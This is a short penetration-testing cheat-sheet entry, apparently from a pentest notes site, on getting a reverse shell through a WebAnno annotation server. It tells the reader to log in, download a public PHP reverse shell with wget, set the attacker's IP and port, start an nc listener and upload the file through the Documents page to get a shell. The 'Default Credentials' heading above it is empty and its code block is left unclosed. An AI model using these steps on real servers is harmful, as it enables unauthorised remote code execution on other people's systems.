## Default Credentials

```bash

<br />

## Reverse Shell

If the target system opens the website assoated with WebAnno service, we can execute reverse shell by uploading the payload and access to the webpage hosts the payload.  

### 1. Go to the Upload Screen in Dashboard

1. Login
2. Click “Projects”.
3. Select the project in left pane.
4. Click Documents tab.

### 2. Prepare Payload

WebAnno allows us to upload arbitrary file format, so we can upload PHP file for reverse shell.

```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php
vim shell.php

# Edit $ip and $port in editor.
```

Then start listener in local machine.

```sh
nc -lvnp 4444
```

### 3. Upload the Payload

In WebAnno dashboard, upload the PHP file in the Documents page.

### 4. Access to the Payload File in Another Server

For instance, access to http://sub.example.com/path/to/shell.php, we can get a shell in the local terminal.
